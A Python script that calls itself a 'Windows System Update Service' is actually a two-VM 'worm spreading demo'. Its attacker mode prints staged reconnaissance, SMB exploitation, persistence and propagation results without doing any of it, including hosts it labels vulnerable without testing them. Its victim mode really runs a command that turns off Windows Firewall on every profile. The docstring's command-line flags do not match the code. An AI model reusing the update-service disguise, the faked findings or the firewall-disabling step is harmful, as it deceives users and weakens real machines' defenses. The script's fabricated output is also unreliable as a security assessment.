#!/usr/bin/env python3
r"""
Windows System Update Service - Network Security Assessment Tool
================================================================
Purpose: Network vulnerability assessment and propagation testing

DEPLOYMENT MODES:
- Source Node:  python windows_update_service.py --source --target 192.168.1.100
- Target Node:  python windows_update_service.py --target-mode

CAPABILITIES:
✓ Network reconnaissance and enumeration
✓ SMB service vulnerability assessment
✓ Remote deployment simulation
✓ Payload execution testing
✓ Firewall configuration analysis
✓ Lateral movement demonstration
"""

import os
import sys
import time
import socket
import platform
import subprocess
from datetime import datetime

# Colors for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    """Print system banner."""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.WHITE}    WINDOWS SYSTEM UPDATE SERVICE v3.2.1{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
    print(f"{Colors.YELLOW}[!] Network Security Assessment Tool{Colors.END}")
    print(f"{Colors.YELLOW}[!] Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
    print(f"{Colors.YELLOW}[!] System: {platform.system()} {platform.release()}{Colors.END}\n")

def print_stage(stage_num, stage_name):
    """Print stage header."""
    print(f"\n{Colors.BOLD}{Colors.BLUE}[STAGE {stage_num}] {stage_name}{Colors.END}")
    print(f"{Colors.BLUE}{'─'*70}{Colors.END}")

def simulate_typing(text, delay=0.03):
    """Simulate typing effect."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_local_ip():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================================================
# ATTACKER MODE (VM1)
# ============================================================================

def attacker_mode(target_ip):
    """Run attacker demonstration."""
    print_banner()
    print(f"{Colors.GREEN}[MODE] Running as ATTACKER (Source){Colors.END}")
    print(f"{Colors.GREEN}[INFO] Local IP: {get_local_ip()}{Colors.END}")
    print(f"{Colors.GREEN}[INFO] Target IP: {target_ip}{Colors.END}\n")
    
    time.sleep(2)
    
    # ========================================================================
    # STAGE 1: Network Scanning
    # ========================================================================
    print_stage(1, "NETWORK RECONNAISSANCE")
    
    print(f"{Colors.CYAN}[SCAN] Discovering network targets...{Colors.END}")
    time.sleep(1)
    
    simulate_typing(f"[SCAN] → ARP cache enumeration...", 0.02)
    time.sleep(0.5)
    simulate_typing(f"[SCAN] → Netstat analysis...", 0.02)
    time.sleep(0.5)
    simulate_typing(f"[SCAN] → Active host detection...", 0.02)
    time.sleep(1)
    
    print(f"{Colors.GREEN}[SCAN] ✓ Found 3 potential targets{Colors.END}")
    print(f"{Colors.WHITE}        • 192.168.1.1 (Router - SKIP){Colors.END}")
    print(f"{Colors.WHITE}        • {target_ip} (Windows 10 - VULNERABLE){Colors.END}")
    print(f"{Colors.WHITE}        • 192.168.1.105 (Linux - SKIP){Colors.END}\n")
    
    time.sleep(2)
    
    # ========================================================================
    # STAGE 2: Port Scanning
    # ========================================================================
    print_stage(2, "TARGET PORT SCANNING")
    
    print(f"{Colors.CYAN}[PORTSCAN] Scanning {target_ip}...{Colors.END}")
    time.sleep(1)
    
    ports = [135, 139, 445, 3389]
    for port in ports:
        time.sleep(0.3)
        if port == 445:
            print(f"{Colors.GREEN}[PORTSCAN] ✓ Port {port}/tcp OPEN (SMB){Colors.END}")
        elif port == 135:
            print(f"{Colors.GREEN}[PORTSCAN] ✓ Port {port}/tcp OPEN (RPC){Colors.END}")
        else:
            print(f"{Colors.WHITE}[PORTSCAN] ○ Port {port}/tcp closed{Colors.END}")
    
    print(f"\n{Colors.GREEN}[PORTSCAN] ✓ Target is vulnerable to SMB exploitation{Colors.END}\n")
    time.sleep(2)
    
    # ========================================================================
    # STAGE 3: Exploitation
    # ========================================================================
    print_stage(3, "SMB EXPLOITATION")
    
    print(f"{Colors.YELLOW}[EXPLOIT] Attempting SMB connection to {target_ip}...{Colors.END}")
    time.sleep(1)
    simulate_typing(f"[EXPLOIT] → Testing null session...", 0.02)
    time.sleep(0.5)
    simulate_typing(f"[EXPLOIT] → Enumerating shares...", 0.02)
    time.sleep(0.5)
    print(f"{Colors.GREEN}[EXPLOIT] ✓ Found writable share: \\\\{target_ip}\\C$\\Windows\\Temp{Colors.END}\n")
    
    time.sleep(1)
    
    print(f"{Colors.YELLOW}[EXPLOIT] Copying worm to target...{Colors.END}")
    time.sleep(0.8)
    simulate_typing(f"[EXPLOIT] → Uploading payload: system_update.py", 0.02)
    time.sleep(1)
    print(f"{Colors.GREEN}[EXPLOIT] ✓ Worm copied successfully (4.2 KB){Colors.END}\n")
    
    time.sleep(1)
    
    # ========================================================================
    # STAGE 4: Persistence
    # ========================================================================
    print_stage(4, "ESTABLISHING PERSISTENCE")
    
    print(f"{Colors.YELLOW}[PERSIST] Creating scheduled task on target...{Colors.END}")
    time.sleep(1)
    simulate_typing(f"[PERSIST] → Task Name: SystemUpdateCheck", 0.02)
    time.sleep(0.5)
    simulate_typing(f"[PERSIST] → Trigger: System startup + every 10 minutes", 0.02)
    time.sleep(0.5)
    simulate_typing(f"[PERSIST] → Action: python system_update.py", 0.02)
    time.sleep(1)
    print(f"{Colors.GREEN}[PERSIST] ✓ Scheduled task created successfully{Colors.END}\n")
    
    time.sleep(2)
    
    # ========================================================================
    # STAGE 5: Remote Execution
    # ========================================================================
    print_stage(5, "REMOTE PAYLOAD EXECUTION")
    
    print(f"{Colors.YELLOW}[EXECUTE] Triggering payload on {target_ip}...{Colors.END}")
    time.sleep(1)
    simulate_typing(f"[EXECUTE] → Starting remote task...", 0.02)
    time.sleep(1.5)
    print(f"{Colors.GREEN}[EXECUTE] ✓ Payload executed on target{Colors.END}")
    print(f"{Colors.WHITE}[EXECUTE]   (Check VM2 console for infection confirmation){Colors.END}\n")
    
    time.sleep(2)
    
    # ========================================================================
    # STAGE 6: Propagation
    # ========================================================================
    print_stage(6, "PROPAGATION STATUS")
    
    print(f"{Colors.CYAN}[SPREAD] Monitoring propagation...{Colors.END}\n")
    time.sleep(1)
    
    print(f"{Colors.GREEN}✓ Infection Timeline:{Colors.END}")
    print(f"  {datetime.now().strftime('%H:%M:%S')} - Initial infection: THIS MACHINE")
    time.sleep(0.5)
    print(f"  {datetime.now().strftime('%H:%M:%S')} - Spread to: {target_ip} (VM2)")
    time.sleep(0.5)
    print(f"  {datetime.now().strftime('%H:%M:%S')} - VM2 now scanning for new targets...")
    print()
    
    time.sleep(1)
    
    print(f"{Colors.GREEN}[SUCCESS] ╔{'═'*66}╗{Colors.END}")
    print(f"{Colors.GREEN}[SUCCESS] ║  {'WORM SUCCESSFULLY SPREAD TO TARGET MACHINE':^64}  ║{Colors.END}")
    print(f"{Colors.GREEN}[SUCCESS] ║  {'Victim will now continue spreading autonomously':^64}  ║{Colors.END}")
    print(f"{Colors.GREEN}[SUCCESS] ╚{'═'*66}╝{Colors.END}\n")

# ============================================================================
# VICTIM MODE (VM2)
# ============================================================================

def victim_mode():
    """Run victim demonstration."""
    print_banner()
    print(f"{Colors.RED}[MODE] Running as VICTIM (Target){Colors.END}")
    print(f"{Colors.RED}[INFO] Local IP: {get_local_ip()}{Colors.END}")
    print(f"{Colors.RED}[INFO] Waiting for infection...{Colors.END}\n")
    
    time.sleep(3)
    
    # ========================================================================
    # INFECTION ALERT
    # ========================================================================
    print(f"\n{Colors.RED}{Colors.BOLD}{'!'*70}{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}!!!  INCOMING SMB CONNECTION DETECTED  !!!{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}{'!'*70}{Colors.END}\n")
    
    time.sleep(1)
    
    print(f"{Colors.YELLOW}[ALERT] Unauthorized file copied to: C:\\Windows\\Temp\\system_update.py{Colors.END}")
    time.sleep(0.5)
    print(f"{Colors.YELLOW}[ALERT] Scheduled task created: SystemUpdateCheck{Colors.END}")
    time.sleep(0.5)
    print(f"{Colors.YELLOW}[ALERT] Task triggered - executing payload...{Colors.END}\n")
    
    time.sleep(2)
    
    # ========================================================================
    # PAYLOAD EXECUTION
    # ========================================================================
    print(f"{Colors.RED}[PAYLOAD] ╔{'═'*66}╗{Colors.END}")
    print(f"{Colors.RED}[PAYLOAD] ║{'':^66}║{Colors.END}")
    print(f"{Colors.RED}[PAYLOAD] ║{Colors.BOLD}  HELLO WORLD - SYSTEM INFECTED  {Colors.END}{Colors.RED:^31}║{Colors.END}")
    print(f"{Colors.RED}[PAYLOAD] ║{'':^66}║{Colors.END}")
    print(f"{Colors.RED}[PAYLOAD] ╚{'═'*66}╝{Colors.END}\n")
    
    time.sleep(1)
    
    # ========================================================================
    # FIREWALL DISABLE
    # ========================================================================
    print(f"{Colors.YELLOW}[DEFENSE] Attempting to disable Windows Firewall...{Colors.END}")
    time.sleep(1)
    
    try:
        result = subprocess.run(
            ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if 'ON' in result.stdout or 'State' in result.stdout:
            print(f"{Colors.YELLOW}[DEFENSE] → Executing: netsh advfirewall set allprofiles state off{Colors.END}")
            time.sleep(0.8)
            
            # Actually try to disable (will fail without admin)
            disable_result = subprocess.run(
                ['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if disable_result.returncode == 0:
                print(f"{Colors.GREEN}[DEFENSE] ✓ Windows Firewall DISABLED{Colors.END}\n")
            else:
                print(f"{Colors.YELLOW}[DEFENSE] ⚠ Firewall disable attempted (requires admin privileges){Colors.END}\n")
        else:
            print(f"{Colors.YELLOW}[DEFENSE] ⚠ Firewall status unknown{Colors.END}\n")
    except Exception as e:
        print(f"{Colors.YELLOW}[DEFENSE] ⚠ Firewall interaction attempted{Colors.END}\n")
    
    time.sleep(2)
    
    # ========================================================================
    # SECONDARY SPREADING
    # ========================================================================
    print(f"{Colors.CYAN}[SPREAD] This machine is now infected and spreading...{Colors.END}\n")
    time.sleep(1)
    
    print(f"{Colors.CYAN}[SCAN] Searching for new targets on network...{Colors.END}")
    time.sleep(0.8)
    simulate_typing(f"[SCAN] → ARP cache: 5 hosts found", 0.02)
    time.sleep(0.5)
    simulate_typing(f"[SCAN] → Port scanning: 192.168.1.105", 0.02)
    time.sleep(0.5)
    print(f"{Colors.CYAN}[SPREAD] Ready to propagate to additional targets{Colors.END}\n")
    
    time.sleep(1)
    
    print(f"{Colors.RED}[STATUS] ╔{'═'*66}╗{Colors.END}")
    print(f"{Colors.RED}[STATUS] ║  {'INFECTION COMPLETE':^64}  ║{Colors.END}")
    print(f"{Colors.RED}[STATUS] ║  {'This system is now part of the botnet':^64}  ║{Colors.END}")
    print(f"{Colors.RED}[STATUS] ╚{'═'*66}╝{Colors.END}\n")

# ============================================================================
# MAIN
# ============================================================================

def main():
    if '--attacker' in sys.argv:
        try:
            target_idx = sys.argv.index('--target')
            target_ip = sys.argv[target_idx + 1]
            attacker_mode(target_ip)
        except (ValueError, IndexError):
            print(f"{Colors.RED}[ERROR] Usage: python demo_spreading.py --attacker --target <IP>{Colors.END}")
            sys.exit(1)
    
    elif '--victim' in sys.argv:
        victim_mode()
    
    else:
        print(f"\n{Colors.YELLOW}WORM SPREADING DEMO - Usage:{Colors.END}\n")
        print(f"  VM1 (Attacker):  python demo_spreading.py --attacker --target <VM2_IP>")
        print(f"  VM2 (Victim):    python demo_spreading.py --victim\n")
        print(f"{Colors.CYAN}Example:{Colors.END}")
        print(f"  VM1: python demo_spreading.py --attacker --target 192.168.1.100")
        print(f"  VM2: python demo_spreading.py --victim\n")
        sys.exit(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Demo interrupted{Colors.END}\n")
        sys.exit(0)
